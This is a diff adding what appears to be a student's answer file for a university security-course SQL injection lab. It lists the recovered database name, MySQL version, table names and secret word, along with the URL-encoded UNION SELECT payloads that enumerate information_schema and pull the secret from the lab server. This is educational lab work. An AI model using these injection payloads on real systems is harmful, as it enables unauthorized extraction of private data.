@@ -1,0 +1,15 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+zygomatic
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2CDATABASE%28%29%3B%23 
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cversion%28%29%3B%23 
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cconcat%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27%23 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cconcat%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27+AND+TABLE_NAME+%21%3D+%27HINT%27%23 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cconcat%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27+AND+TABLE_NAME+%21%3D+%27HINT%27+AND+TABLE_NAME+%21%3D+%27SECRET%27%23 
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cconcat%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27+AND+TABLE_NAME+%21%3D+%27HINT%27+AND+TABLE_NAME+%21%3D+%27SECRET%27+AND+TABLE_NAME+%21%3D+%27foo%27%23 
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C%27%27%2C%27%27%2Cconcat%28secret%29+FROM+SECRET+WHERE+hash%3Dmd5%28%27mirecki2%27%29%23 
